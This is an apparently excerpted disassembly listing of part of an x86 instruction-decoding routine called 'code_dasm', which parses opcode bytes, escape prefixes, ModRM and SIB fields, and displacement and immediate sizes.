.text.x86_codd:00000000000004E9                 jmp     loc_AA6
.text.x86_codd:00000000000004EE ; ---------------------------------------------------------------------------
.text.x86_codd:00000000000004EE
.text.x86_codd:00000000000004EE loc_4EE:                                ; CODE XREF: code_dasm+3DD↑j
.text.x86_codd:00000000000004EE                 mov     ecx, [rbx+28h]
.text.x86_codd:00000000000004F1                 shl     ecx, 8
.text.x86_codd:00000000000004F4                 mov     [rbx+28h], ecx
.text.x86_codd:00000000000004F7                 movzx   eax, byte ptr [rdx]
.text.x86_codd:00000000000004FA                 or      eax, ecx
.text.x86_codd:00000000000004FC                 mov     [rbx+28h], eax
.text.x86_codd:00000000000004FF                 mov     esi, eax
.text.x86_codd:0000000000000501                 test    byte ptr [rbx+10h], 10h
.text.x86_codd:0000000000000505                 jz      short loc_50D
.text.x86_codd:0000000000000507                 and     esi, 0FFFFFFh
.text.x86_codd:000000000000050D
.text.x86_codd:000000000000050D loc_50D:                                ; CODE XREF: code_dasm+4F5↑j
.text.x86_codd:000000000000050D                 mov     r8d, esi
.text.x86_codd:0000000000000510                 and     r8d, 0FF00h
.text.x86_codd:0000000000000517                 cmp     r8d, 3800h
.text.x86_codd:000000000000051E                 jnz     short loc_569
.text.x86_codd:0000000000000520                 mov     edi, esi
.text.x86_codd:0000000000000522                 lea     rcx, byte_AD20
.text.x86_codd:0000000000000529                 and     esi, 7
.text.x86_codd:000000000000052C                 shr     edi, 3
.text.x86_codd:000000000000052F                 and     edi, 1Fh
.text.x86_codd:0000000000000532                 movzx   ecx, byte ptr [rcx+rdi]
.text.x86_codd:0000000000000536                 bt      ecx, esi
.text.x86_codd:0000000000000539                 jnb     loc_5F6
.text.x86_codd:000000000000053F                 xor     r8d, r8d
.text.x86_codd:0000000000000542                 mov     rcx, rdx
.text.x86_codd:0000000000000545                 mov     [rbx+48h], r8
.text.x86_codd:0000000000000549                 lea     r8, byte_AD00
.text.x86_codd:0000000000000550                 sub     rcx, r12
.text.x86_codd:0000000000000553                 movzx   edi, byte ptr [r8+rdi]
.text.x86_codd:0000000000000558                 mov     [rbx+50h], cl
.text.x86_codd:000000000000055B                 bt      edi, esi
.text.x86_codd:000000000000055E                 jnb     loc_63D
.text.x86_codd:0000000000000564                 jmp     loc_8B5
.text.x86_codd:0000000000000569 ; ---------------------------------------------------------------------------
.text.x86_codd:0000000000000569
.text.x86_codd:0000000000000569 loc_569:                                ; CODE XREF: code_dasm+50E↑j
.text.x86_codd:0000000000000569                 movzx   eax, sil
.text.x86_codd:000000000000056D                 cmp     sil, 0F0h
.text.x86_codd:0000000000000571                 ja      short loc_5C6
.text.x86_codd:0000000000000573                 cmp     eax, 0CBh
.text.x86_codd:0000000000000578                 ja      short loc_58C
.text.x86_codd:000000000000057A                 cmp     eax, 39h ; '9'
.text.x86_codd:000000000000057D                 ja      short loc_5A7
.text.x86_codd:000000000000057F                 cmp     eax, 37h ; '7'
.text.x86_codd:0000000000000582                 ja      short loc_5AF
.text.x86_codd:0000000000000584                 lea     ecx, [rax-20h]
.text.x86_codd:0000000000000587                 cmp     ecx, 2
.text.x86_codd:000000000000058A                 jmp     short loc_5AD
.text.x86_codd:000000000000058C ; ---------------------------------------------------------------------------
.text.x86_codd:000000000000058C
.text.x86_codd:000000000000058C loc_58C:                                ; CODE XREF: code_dasm+568↑j
.text.x86_codd:000000000000058C                 mov     rdi, 1000080001h
.text.x86_codd:0000000000000596                 lea     ecx, [rax-0CCh]
.text.x86_codd:000000000000059C                 shr     rdi, cl
.text.x86_codd:000000000000059F                 and     dil, 1
.text.x86_codd:00000000000005A3                 jz      short loc_5C6
.text.x86_codd:00000000000005A5                 jmp     short loc_5AF
.text.x86_codd:00000000000005A7 ; ---------------------------------------------------------------------------
.text.x86_codd:00000000000005A7
.text.x86_codd:00000000000005A7 loc_5A7:                                ; CODE XREF: code_dasm+56D↑j
.text.x86_codd:00000000000005A7                 lea     ecx, [rax-60h]
.text.x86_codd:00000000000005AA                 cmp     ecx, 3
.text.x86_codd:00000000000005AD
.text.x86_codd:00000000000005AD loc_5AD:                                ; CODE XREF: code_dasm+57A↑j
.text.x86_codd:00000000000005AD                 ja      short loc_5C6
.text.x86_codd:00000000000005AF
.text.x86_codd:00000000000005AF loc_5AF:                                ; CODE XREF: code_dasm+572↑j
.text.x86_codd:00000000000005AF                                         ; code_dasm+595↑j
.text.x86_codd:00000000000005AF                 mov     rax, rdx
.text.x86_codd:00000000000005B2                 sub     rax, r12
.text.x86_codd:00000000000005B5                 mov     [rbx+50h], al
.text.x86_codd:00000000000005B8                 cmp     r8d, 3A00h
.text.x86_codd:00000000000005BF                 jz      short loc_62C
.text.x86_codd:00000000000005C1                 jmp     loc_657
.text.x86_codd:00000000000005C6 ; ---------------------------------------------------------------------------
.text.x86_codd:00000000000005C6
.text.x86_codd:00000000000005C6 loc_5C6:                                ; CODE XREF: code_dasm+561↑j
.text.x86_codd:00000000000005C6                                         ; code_dasm+593↑j ...
.text.x86_codd:00000000000005C6                 mov     ecx, esi
.text.x86_codd:00000000000005C8                 mov     edi, esi
.text.x86_codd:00000000000005CA                 shr     sil, 4
.text.x86_codd:00000000000005CE                 and     ecx, 0Fh
.text.x86_codd:00000000000005D1                 cmp     sil, 1
.text.x86_codd:00000000000005D5                 jz      short loc_5EB
.text.x86_codd:00000000000005D7                 cmp     sil, 4
.text.x86_codd:00000000000005DB                 jz      short loc_604
.text.x86_codd:00000000000005DD                 test    sil, sil
.text.x86_codd:00000000000005E0                 jnz     short loc_5F6
.text.x86_codd:00000000000005E2                 and     edi, 0Bh
.text.x86_codd:00000000000005E5                 cmp     dil, 3
.text.x86_codd:00000000000005E9                 jmp     short loc_5F4
.text.x86_codd:00000000000005EB ; ---------------------------------------------------------------------------
.text.x86_codd:00000000000005EB
.text.x86_codd:00000000000005EB loc_5EB:                                ; CODE XREF: code_dasm+5C5↑j
.text.x86_codd:00000000000005EB                 cmp     cl, 9
.text.x86_codd:00000000000005EE                 ja      short loc_5FD
.text.x86_codd:00000000000005F0                 and     dil, 0Ch
.text.x86_codd:00000000000005F4
.text.x86_codd:00000000000005F4 loc_5F4:                                ; CODE XREF: code_dasm+5D9↑j
.text.x86_codd:00000000000005F4                                         ; code_dasm+600↓j
.text.x86_codd:00000000000005F4                 jnz     short loc_612
.text.x86_codd:00000000000005F6
.text.x86_codd:00000000000005F6 loc_5F6:                                ; CODE XREF: code_dasm+2D↑j
.text.x86_codd:00000000000005F6                                         ; code_dasm+B4↑j ...
.text.x86_codd:00000000000005F6                 xor     eax, eax
.text.x86_codd:00000000000005F8                 jmp     loc_AA6
.text.x86_codd:00000000000005FD ; ---------------------------------------------------------------------------
.text.x86_codd:00000000000005FD
.text.x86_codd:00000000000005FD loc_5FD:                                ; CODE XREF: code_dasm+5DE↑j
.text.x86_codd:00000000000005FD                 cmp     cl, 0Dh
.text.x86_codd:0000000000000600                 jz      short loc_612
.text.x86_codd:0000000000000602                 jmp     short loc_5F6
.text.x86_codd:0000000000000604 ; ---------------------------------------------------------------------------
.text.x86_codd:0000000000000604
.text.x86_codd:0000000000000604 loc_604:                                ; CODE XREF: code_dasm+5CB↑j
.text.x86_codd:0000000000000604                 mov     esi, 1C57h
.text.x86_codd:0000000000000609                 shr     rsi, cl
.text.x86_codd:000000000000060C                 and     sil, 1
.text.x86_codd:0000000000000610                 jmp     short loc_5F4
.text.x86_codd:0000000000000612 ; ---------------------------------------------------------------------------
.text.x86_codd:0000000000000612
.text.x86_codd:0000000000000612 loc_612:                                ; CODE XREF: code_dasm:loc_5F4↑j
.text.x86_codd:0000000000000612                                         ; code_dasm+5F0↑j
.text.x86_codd:0000000000000612                 mov     rcx, rdx
.text.x86_codd:0000000000000615                 sub     rcx, r12
.text.x86_codd:0000000000000618                 mov     [rbx+50h], cl
.text.x86_codd:000000000000061B                 cmp     r8d, 3A00h
.text.x86_codd:0000000000000622                 jnz     short loc_657
.text.x86_codd:0000000000000624                 sub     eax, 4Ah ; 'J'
.text.x86_codd:0000000000000627                 cmp     eax, 2
.text.x86_codd:000000000000062A                 jbe     short loc_657
.text.x86_codd:000000000000062C
.text.x86_codd:000000000000062C loc_62C:                                ; CODE XREF: code_dasm+5AF↑j
.text.x86_codd:000000000000062C                 or      byte ptr [rbx+11h], 8
.text.x86_codd:0000000000000630                 mov     qword ptr [rbx+48h], 1
.text.x86_codd:0000000000000638                 jmp     loc_8B5
.text.x86_codd:000000000000063D ; ---------------------------------------------------------------------------
.text.x86_codd:000000000000063D
.text.x86_codd:000000000000063D loc_63D:                                ; CODE XREF: code_dasm+54E↑j
.text.x86_codd:000000000000063D                 test    byte ptr [rbx+11h], 8
.text.x86_codd:0000000000000641                 jnz     short loc_66D
.text.x86_codd:0000000000000643                 mov     [rbx], r12
.text.x86_codd:0000000000000646                 lea     rdx, [rcx+1]
.text.x86_codd:000000000000064A                 jmp     loc_4D1
.text.x86_codd:000000000000064F ; ---------------------------------------------------------------------------
.text.x86_codd:000000000000064F
.text.x86_codd:000000000000064F loc_64F:                                ; CODE XREF: code_dasm+356↑j
.text.x86_codd:000000000000064F                                         ; code_dasm+94D↓j
.text.x86_codd:000000000000064F                 inc     rdx
.text.x86_codd:0000000000000652                 jmp     loc_72C
.text.x86_codd:0000000000000657 ; ---------------------------------------------------------------------------
.text.x86_codd:0000000000000657
.text.x86_codd:0000000000000657 loc_657:                                ; CODE XREF: code_dasm+5B1↑j
.text.x86_codd:0000000000000657                                         ; code_dasm+612↑j ...
.text.x86_codd:0000000000000657                 xor     eax, eax
.text.x86_codd:0000000000000659                 mov     [rbx+48h], rax
.text.x86_codd:000000000000065D                 jmp     loc_8B5
.text.x86_codd:0000000000000662 ; ---------------------------------------------------------------------------
.text.x86_codd:0000000000000662
.text.x86_codd:0000000000000662 loc_662:                                ; CODE XREF: code_dasm+F6↑j
.text.x86_codd:0000000000000662                                         ; code_dasm+105↑j
.text.x86_codd:0000000000000662                 mov     rdx, rax
.text.x86_codd:0000000000000665
.text.x86_codd:0000000000000665 loc_665:                                ; CODE XREF: code_dasm+123↑j
.text.x86_codd:0000000000000665                 cmp     rdx, rbp
.text.x86_codd:0000000000000668                 jmp     loc_55
.text.x86_codd:000000000000066D ; ---------------------------------------------------------------------------
.text.x86_codd:000000000000066D
.text.x86_codd:000000000000066D loc_66D:                                ; CODE XREF: code_dasm+373↑j
.text.x86_codd:000000000000066D                                         ; code_dasm+37D↑j ...
.text.x86_codd:000000000000066D                 inc     rdx
.text.x86_codd:0000000000000670
.text.x86_codd:0000000000000670 loc_670:                                ; CODE XREF: code_dasm+897↓j
.text.x86_codd:0000000000000670                                         ; code_dasm+8A0↓j ...
.text.x86_codd:0000000000000670                 cmp     rdx, rbp
.text.x86_codd:0000000000000673                 jnb     loc_A95
.text.x86_codd:0000000000000679                 mov     rax, [rbx+48h]
.text.x86_codd:000000000000067D                 movzx   esi, byte ptr [rdx]
.text.x86_codd:0000000000000680                 cmp     rax, 1
.text.x86_codd:0000000000000684                 jnz     short loc_6A4
.text.x86_codd:0000000000000686                 sub     rax, r12
.text.x86_codd:0000000000000689                 movsx   rcx, sil
.text.x86_codd:000000000000068D                 mov     [rbx+40h], rsi
.text.x86_codd:0000000000000691                 add     rdx, rax
.text.x86_codd:0000000000000694                 mov     [rbx+38h], rcx
.text.x86_codd:0000000000000698                 mov     [rbx], r12
.text.x86_codd:000000000000069B                 mov     [rbx+8], rdx
.text.x86_codd:000000000000069F                 jmp     loc_7DB
.text.x86_codd:00000000000006A4 ; ---------------------------------------------------------------------------
.text.x86_codd:00000000000006A4
.text.x86_codd:00000000000006A4 loc_6A4:                                ; CODE XREF: code_dasm+674↑j
.text.x86_codd:00000000000006A4                 mov     rcx, 0FF000000000004h
.text.x86_codd:00000000000006AE                 and     rcx, [rbx+10h]
.text.x86_codd:00000000000006B2                 lea     rdx, [rdx+1]
.text.x86_codd:00000000000006B6                 mov     rdi, 66000000000004h
.text.x86_codd:00000000000006C0                 cmp     rcx, rdi
.text.x86_codd:00000000000006C3                 jnz     short loc_6E3
.text.x86_codd:00000000000006C5                 cmp     rax, 2
.text.x86_codd:00000000000006C9                 jnz     short loc_6D5
.text.x86_codd:00000000000006CB                 mov     qword ptr [rbx+48h], 4
.text.x86_codd:00000000000006D3                 jmp     short loc_6E3
.text.x86_codd:00000000000006D5 ; ---------------------------------------------------------------------------
.text.x86_codd:00000000000006D5
.text.x86_codd:00000000000006D5 loc_6D5:                                ; CODE XREF: code_dasm+6B9↑j
.text.x86_codd:00000000000006D5                 cmp     rax, 4
.text.x86_codd:00000000000006D9                 jnz     short loc_6E3
.text.x86_codd:00000000000006DB                 mov     qword ptr [rbx+48h], 2
.text.x86_codd:00000000000006E3
.text.x86_codd:00000000000006E3 loc_6E3:                                ; CODE XREF: code_dasm+6B3↑j
.text.x86_codd:00000000000006E3                                         ; code_dasm+6C3↑j ...
.text.x86_codd:00000000000006E3                 cmp     rdx, rbp
.text.x86_codd:00000000000006E6                 jnb     loc_A95
.text.x86_codd:00000000000006EC                 movzx   eax, byte ptr [rdx]
.text.x86_codd:00000000000006EF                 mov     rdi, [rbx+48h]
.text.x86_codd:00000000000006F3                 shl     rax, 8
.text.x86_codd:00000000000006F7                 or      rax, rsi
.text.x86_codd:00000000000006FA                 cmp     rdi, 2
.text.x86_codd:00000000000006FE                 jnz     loc_7E9
.text.x86_codd:0000000000000704                 mov     [rbx+40h], rax
.text.x86_codd:0000000000000708                 sub     rdx, r12
.text.x86_codd:000000000000070B                 movsx   rax, ax
.text.x86_codd:000000000000070F                 mov     [rbx+38h], rax
.text.x86_codd:0000000000000713                 lea     rax, [rdx+1]
.text.x86_codd:0000000000000717                 mov     [rbx], r12
.text.x86_codd:000000000000071A                 jmp     loc_7D4
.text.x86_codd:000000000000071F ; ---------------------------------------------------------------------------
.text.x86_codd:000000000000071F
.text.x86_codd:000000000000071F loc_71F:                                ; CODE XREF: code_dasm+99E↓j
.text.x86_codd:000000000000071F                 test    cl, 1
.text.x86_codd:0000000000000722                 jz      loc_9BA
.text.x86_codd:0000000000000728                 add     rdx, 2
.text.x86_codd:000000000000072C
.text.x86_codd:000000000000072C loc_72C:                                ; CODE XREF: code_dasm+642↑j
.text.x86_codd:000000000000072C                 cmp     rdx, rbp
.text.x86_codd:000000000000072F                 jnb     loc_A95
.text.x86_codd:0000000000000735                 lea     rax, [rdx+1]
.text.x86_codd:0000000000000739                 movzx   ecx, byte ptr [rdx]
.text.x86_codd:000000000000073C                 cmp     rax, rbp
.text.x86_codd:000000000000073F                 jnb     loc_A95
.text.x86_codd:0000000000000745                 movzx   eax, byte ptr [rdx+1]
.text.x86_codd:0000000000000749                 shl     eax, 8
.text.x86_codd:000000000000074C                 or      rax, rcx
.text.x86_codd:000000000000074F                 lea     rcx, [rdx+2]
.text.x86_codd:0000000000000753                 cmp     rcx, rbp
.text.x86_codd:0000000000000756                 jnb     loc_A95
.text.x86_codd:000000000000075C                 movzx   ecx, byte ptr [rdx+2]
.text.x86_codd:0000000000000760                 lea     rsi, [rdx+3]
.text.x86_codd:0000000000000764                 shl     ecx, 10h
.text.x86_codd:0000000000000767                 or      rcx, rax
.text.x86_codd:000000000000076A                 cmp     rsi, rbp
.text.x86_codd:000000000000076D                 jnb     loc_A95
.text.x86_codd:0000000000000773                 movzx   eax, byte ptr [rdx+3]
.text.x86_codd:0000000000000777                 shl     eax, 18h
.text.x86_codd:000000000000077A                 or      eax, ecx
.text.x86_codd:000000000000077C                 mov     cl, [rbx+11h]
.text.x86_codd:000000000000077F                 cdqe
.text.x86_codd:0000000000000781                 mov     [rbx+30h], rax
.text.x86_codd:0000000000000785                 test    cl, 4
.text.x86_codd:0000000000000788                 jz      loc_89E
.text.x86_codd:000000000000078E                 lea     rax, [rdx+4]
.text.x86_codd:0000000000000792                 cmp     rax, rbp
.text.x86_codd:0000000000000795                 jnb     loc_A95
.text.x86_codd:000000000000079B                 lea     rax, [rdx+5]
.text.x86_codd:000000000000079F                 cmp     rax, rbp
.text.x86_codd:00000000000007A2                 jnb     loc_A95
.text.x86_codd:00000000000007A8                 lea     rax, [rdx+6]
.text.x86_codd:00000000000007AC                 cmp     rax, rbp
.text.x86_codd:00000000000007AF                 jnb     loc_A95
.text.x86_codd:00000000000007B5                 lea     rax, [rdx+7]
.text.x86_codd:00000000000007B9                 cmp     rax, rbp
.text.x86_codd:00000000000007BC                 jnb     loc_A95
.text.x86_codd:00000000000007C2                 and     cl, 8
.text.x86_codd:00000000000007C5                 jnz     loc_8AC
.text.x86_codd:00000000000007CB                 mov     [rbx], r12
.text.x86_codd:00000000000007CE                 sub     rax, r12
.text.x86_codd:00000000000007D1                 inc     rax
.text.x86_codd:00000000000007D4
.text.x86_codd:00000000000007D4 loc_7D4:                                ; CODE XREF: code_dasm+70A↑j
.text.x86_codd:00000000000007D4                                         ; code_dasm+889↓j
.text.x86_codd:00000000000007D4                 mov     [rbx+8], rax
.text.x86_codd:00000000000007D8                 test    rax, rax
.text.x86_codd:00000000000007DB
.text.x86_codd:00000000000007DB loc_7DB:                                ; CODE XREF: code_dasm+68F↑j
.text.x86_codd:00000000000007DB                 jz      loc_5F6
.text.x86_codd:00000000000007E1                 mov     eax, [rbx+28h]
.text.x86_codd:00000000000007E4                 jmp     loc_4DE
.text.x86_codd:00000000000007E9 ; ---------------------------------------------------------------------------
.text.x86_codd:00000000000007E9
.text.x86_codd:00000000000007E9 loc_7E9:                                ; CODE XREF: code_dasm+6EE↑j
.text.x86_codd:00000000000007E9                 lea     rcx, [rdx+1]
.text.x86_codd:00000000000007ED                 cmp     rcx, rbp
.text.x86_codd:00000000000007F0                 jnb     loc_A95
.text.x86_codd:00000000000007F6                 movzx   ecx, byte ptr [rdx+1]
.text.x86_codd:00000000000007FA                 lea     rsi, [rdx+2]
.text.x86_codd:00000000000007FE                 shl     rcx, 10h
.text.x86_codd:0000000000000802                 or      rcx, rax
.text.x86_codd:0000000000000805                 cmp     rsi, rbp
.text.x86_codd:0000000000000808                 jnb     loc_A95
.text.x86_codd:000000000000080E                 movzx   eax, byte ptr [rdx+2]
.text.x86_codd:0000000000000812                 shl     rax, 18h
.text.x86_codd:0000000000000816                 or      rax, rcx
.text.x86_codd:0000000000000819                 cmp     rdi, 4
.text.x86_codd:000000000000081D                 jnz     short loc_827
.text.x86_codd:000000000000081F                 mov     [rbx+40h], rax
.text.x86_codd:0000000000000823                 cdqe
.text.x86_codd:0000000000000825                 jmp     short loc_88B
.text.x86_codd:0000000000000827 ; ---------------------------------------------------------------------------
.text.x86_codd:0000000000000827
.text.x86_codd:0000000000000827 loc_827:                                ; CODE XREF: code_dasm+80D↑j
.text.x86_codd:0000000000000827                 lea     rcx, [rdx+3]
.text.x86_codd:000000000000082B                 cmp     rcx, rbp
.text.x86_codd:000000000000082E                 jnb     loc_A95
.text.x86_codd:0000000000000834                 movzx   ecx, byte ptr [rdx+3]
.text.x86_codd:0000000000000838                 shl     rcx, 20h
.text.x86_codd:000000000000083C                 or      rcx, rax
.text.x86_codd:000000000000083F                 lea     rax, [rdx+4]
.text.x86_codd:0000000000000843                 cmp     rax, rbp
.text.x86_codd:0000000000000846                 jnb     loc_A95
.text.x86_codd:000000000000084C                 movzx   eax, byte ptr [rdx+4]
.text.x86_codd:0000000000000850                 shl     rax, 28h
.text.x86_codd:0000000000000854                 or      rax, rcx
.text.x86_codd:0000000000000857                 lea     rcx, [rdx+5]
.text.x86_codd:000000000000085B                 cmp     rcx, rbp
.text.x86_codd:000000000000085E                 jnb     loc_A95
.text.x86_codd:0000000000000864                 movzx   ecx, byte ptr [rdx+5]
.text.x86_codd:0000000000000868                 lea     rsi, [rdx+6]
.text.x86_codd:000000000000086C                 shl     rcx, 30h
.text.x86_codd:0000000000000870                 or      rcx, rax
.text.x86_codd:0000000000000873                 cmp     rsi, rbp
.text.x86_codd:0000000000000876                 jnb     loc_A95
.text.x86_codd:000000000000087C                 movzx   eax, byte ptr [rdx+6]
.text.x86_codd:0000000000000880                 shl     rax, 38h
.text.x86_codd:0000000000000884                 or      rax, rcx
.text.x86_codd:0000000000000887                 mov     [rbx+40h], rax
.text.x86_codd:000000000000088B
.text.x86_codd:000000000000088B loc_88B:                                ; CODE XREF: code_dasm+815↑j
.text.x86_codd:000000000000088B                 mov     [rbx+38h], rax
.text.x86_codd:000000000000088F
.text.x86_codd:000000000000088F loc_88F:                                ; CODE XREF: code_dasm+891↓j
.text.x86_codd:000000000000088F                 sub     rsi, r12
.text.x86_codd:0000000000000892                 mov     [rbx], r12
.text.x86_codd:0000000000000895                 lea     rax, [rsi+1]
.text.x86_codd:0000000000000899                 jmp     loc_7D4
.text.x86_codd:000000000000089E ; ---------------------------------------------------------------------------
.text.x86_codd:000000000000089E
.text.x86_codd:000000000000089E loc_89E:                                ; CODE XREF: code_dasm+778↑j
.text.x86_codd:000000000000089E                 and     cl, 8
.text.x86_codd:00000000000008A1                 jz      short loc_88F
.text.x86_codd:00000000000008A3                 add     rdx, 4
.text.x86_codd:00000000000008A7                 jmp     loc_670
.text.x86_codd:00000000000008AC ; ---------------------------------------------------------------------------
.text.x86_codd:00000000000008AC
.text.x86_codd:00000000000008AC loc_8AC:                                ; CODE XREF: code_dasm+7B5↑j
.text.x86_codd:00000000000008AC                 add     rdx, 8
.text.x86_codd:00000000000008B0                 jmp     loc_670
.text.x86_codd:00000000000008B5 ; ---------------------------------------------------------------------------
.text.x86_codd:00000000000008B5
.text.x86_codd:00000000000008B5 loc_8B5:                                ; CODE XREF: code_dasm+341↑j
.text.x86_codd:00000000000008B5                                         ; code_dasm+4AA↑j ...
.text.x86_codd:00000000000008B5                 inc     rdx
.text.x86_codd:00000000000008B8                 cmp     rdx, rbp
.text.x86_codd:00000000000008BB                 jnb     loc_A95
.text.x86_codd:00000000000008C1                 mov     sil, [rbx+10h]
.text.x86_codd:00000000000008C5                 mov     eax, esi
.text.x86_codd:00000000000008C7                 or      eax, 40h
.text.x86_codd:00000000000008CA                 mov     [rbx+10h], al
.text.x86_codd:00000000000008CD                 mov     al, [rdx]
.text.x86_codd:00000000000008CF                 mov     [rbx+1Ch], al
.text.x86_codd:00000000000008D2                 shr     al, 6
.text.x86_codd:00000000000008D5                 mov     [rbx+1Dh], al
.text.x86_codd:00000000000008D8                 movzx   ecx, byte ptr [rdx]
.text.x86_codd:00000000000008DB                 sar     ecx, 3
.text.x86_codd:00000000000008DE                 and     ecx, 7
.text.x86_codd:00000000000008E1                 mov     [rbx+1Eh], cl
.text.x86_codd:00000000000008E4                 mov     dil, [rdx]
.text.x86_codd:00000000000008E7                 and     edi, 7
.text.x86_codd:00000000000008EA                 mov     [rbx+1Fh], dil
.text.x86_codd:00000000000008EE                 cmp     al, 3
.text.x86_codd:00000000000008F0                 jnz     short loc_903
.text.x86_codd:00000000000008F2
.text.x86_codd:00000000000008F2 loc_8F2:                                ; CODE XREF: code_dasm+90C↓j
.text.x86_codd:00000000000008F2                 mov     eax, [rbx+1Ch]
.text.x86_codd:00000000000008F5                 and     eax, 0FF00FF00h
.text.x86_codd:00000000000008FA                 cmp     eax, 5000000h
.text.x86_codd:00000000000008FF                 jnz     short loc_922
.text.x86_codd:0000000000000901                 jmp     short loc_91E
.text.x86_codd:0000000000000903 ; ---------------------------------------------------------------------------
.text.x86_codd:0000000000000903
.text.x86_codd:0000000000000903 loc_903:                                ; CODE XREF: code_dasm+8E0↑j
.text.x86_codd:0000000000000903                 cmp     dil, 4
.text.x86_codd:0000000000000907                 jnz     short loc_910
.text.x86_codd:0000000000000909                 or      esi, 0FFFFFFC0h
.text.x86_codd:000000000000090C                 mov     [rbx+10h], sil
.text.x86_codd:0000000000000910
.text.x86_codd:0000000000000910 loc_910:                                ; CODE XREF: code_dasm+8F7↑j
.text.x86_codd:0000000000000910                 cmp     al, 1
.text.x86_codd:0000000000000912                 jnz     short loc_91A
.text.x86_codd:0000000000000914                 or      byte ptr [rbx+11h], 3
.text.x86_codd:0000000000000918                 jmp     short loc_922
.text.x86_codd:000000000000091A ; ---------------------------------------------------------------------------
.text.x86_codd:000000000000091A
.text.x86_codd:000000000000091A loc_91A:                                ; CODE XREF: code_dasm+902↑j
.text.x86_codd:000000000000091A                 cmp     al, 2
.text.x86_codd:000000000000091C                 jnz     short loc_8F2
.text.x86_codd:000000000000091E
.text.x86_codd:000000000000091E loc_91E:                                ; CODE XREF: code_dasm+8F1↑j
.text.x86_codd:000000000000091E                 or      byte ptr [rbx+11h], 1
.text.x86_codd:0000000000000922
.text.x86_codd:0000000000000922 loc_922:                                ; CODE XREF: code_dasm+8EF↑j
.text.x86_codd:0000000000000922                                         ; code_dasm+908↑j
.text.x86_codd:0000000000000922                 mov     eax, [rbx+28h]
.text.x86_codd:0000000000000925                 lea     esi, [rax-0F6h]
.text.x86_codd:000000000000092B                 cmp     esi, 1
.text.x86_codd:000000000000092E                 ja      short loc_93E
.text.x86_codd:0000000000000930                 test    cl, cl
.text.x86_codd:0000000000000932                 jz      short loc_93E
.text.x86_codd:0000000000000934                 xor     ecx, ecx
.text.x86_codd:0000000000000936                 and     byte ptr [rbx+11h], 0F7h
.text.x86_codd:000000000000093A                 mov     [rbx+48h], rcx
.text.x86_codd:000000000000093E
.text.x86_codd:000000000000093E loc_93E:                                ; CODE XREF: code_dasm+91E↑j
.text.x86_codd:000000000000093E                                         ; code_dasm+922↑j
.text.x86_codd:000000000000093E                 cmp     byte ptr [rbx+10h], 0
.text.x86_codd:0000000000000942                 jns     short loc_952
.text.x86_codd:0000000000000944                 lea     rsi, [rdx+1]
.text.x86_codd:0000000000000948                 cmp     rsi, rbp
.text.x86_codd:000000000000094B                 jb      short loc_96B
.text.x86_codd:000000000000094D                 jmp     loc_A95
.text.x86_codd:0000000000000952 ; ---------------------------------------------------------------------------
.text.x86_codd:0000000000000952
.text.x86_codd:0000000000000952 loc_952:                                ; CODE XREF: code_dasm+932↑j
.text.x86_codd:0000000000000952                 mov     cl, [rbx+11h]
.text.x86_codd:0000000000000955                 test    cl, 2
.text.x86_codd:0000000000000958                 jnz     short loc_9D7
.text.x86_codd:000000000000095A                 test    cl, 1
.text.x86_codd:000000000000095D                 jnz     loc_64F
.text.x86_codd:0000000000000963                 and     cl, 8
.text.x86_codd:0000000000000966                 jmp     loc_9EF
.text.x86_codd:000000000000096B ; ---------------------------------------------------------------------------
.text.x86_codd:000000000000096B
.text.x86_codd:000000000000096B loc_96B:                                ; CODE XREF: code_dasm+93B↑j
.text.x86_codd:000000000000096B                 mov     cl, [rdx+1]
.text.x86_codd:000000000000096E                 mov     [rbx+21h], cl
.text.x86_codd:0000000000000971                 shr     cl, 6
.text.x86_codd:0000000000000974                 mov     [rbx+22h], cl
.text.x86_codd:0000000000000977                 movzx   ecx, byte ptr [rdx+1]
.text.x86_codd:000000000000097B                 sar     ecx, 3
.text.x86_codd:000000000000097E                 and     ecx, 7
.text.x86_codd:0000000000000981                 mov     [rbx+23h], cl
.text.x86_codd:0000000000000984                 mov     cl, [rdx+1]
.text.x86_codd:0000000000000987                 and     ecx, 7
.text.x86_codd:000000000000098A                 mov     [rbx+24h], cl
.text.x86_codd:000000000000098D                 cmp     cl, 5
.text.x86_codd:0000000000000990                 jnz     short loc_9A8
.text.x86_codd:0000000000000992                 mov     cl, [rbx+1Dh]
.text.x86_codd:0000000000000995                 test    cl, 0FDh
.text.x86_codd:0000000000000998                 jnz     short loc_9A0
.text.x86_codd:000000000000099A                 or      byte ptr [rbx+11h], 1
.text.x86_codd:000000000000099E                 jmp     short loc_9A8
.text.x86_codd:00000000000009A0 ; ---------------------------------------------------------------------------
.text.x86_codd:00000000000009A0
.text.x86_codd:00000000000009A0 loc_9A0:                                ; CODE XREF: code_dasm+988↑j
.text.x86_codd:00000000000009A0                 dec     cl
.text.x86_codd:00000000000009A2                 jnz     short loc_9A8
.text.x86_codd:00000000000009A4                 or      byte ptr [rbx+11h], 3
.text.x86_codd:00000000000009A8
.text.x86_codd:00000000000009A8 loc_9A8:                                ; CODE XREF: code_dasm+980↑j
.text.x86_codd:00000000000009A8                                         ; code_dasm+98E↑j ...
.text.x86_codd:00000000000009A8                 mov     cl, [rbx+11h]
.text.x86_codd:00000000000009AB                 test    cl, 2
.text.x86_codd:00000000000009AE                 jz      loc_71F
.text.x86_codd:00000000000009B4                 add     rdx, 2
.text.x86_codd:00000000000009B8                 jmp     short loc_9DA
.text.x86_codd:00000000000009BA ; ---------------------------------------------------------------------------
.text.x86_codd:00000000000009BA
.text.x86_codd:00000000000009BA loc_9BA:                                ; CODE XREF: code_dasm+712↑j
.text.x86_codd:00000000000009BA                 and     cl, 8
.text.x86_codd:00000000000009BD                 jz      short loc_9C8
.text.x86_codd:00000000000009BF                 add     rdx, 2
.text.x86_codd:00000000000009C3                 jmp     loc_670
.text.x86_codd:00000000000009C8 ; ---------------------------------------------------------------------------
.text.x86_codd:00000000000009C8
.text.x86_codd:00000000000009C8 loc_9C8:                                ; CODE XREF: code_dasm+9AD↑j
.text.x86_codd:00000000000009C8                 sub     rsi, r12
.text.x86_codd:00000000000009CB                 mov     [rbx], r12
.text.x86_codd:00000000000009CE                 lea     rdx, [rsi+1]
.text.x86_codd:00000000000009D2                 jmp     loc_4D1
.text.x86_codd:00000000000009D7 ; ---------------------------------------------------------------------------
.text.x86_codd:00000000000009D7
.text.x86_codd:00000000000009D7 loc_9D7:                                ; CODE XREF: code_dasm+948↑j
.text.x86_codd:00000000000009D7                 inc     rdx
.text.x86_codd:00000000000009DA
.text.x86_codd:00000000000009DA loc_9DA:                                ; CODE XREF: code_dasm+9A8↑j
.text.x86_codd:00000000000009DA                 cmp     rdx, rbp
.text.x86_codd:00000000000009DD                 jnb     loc_A95
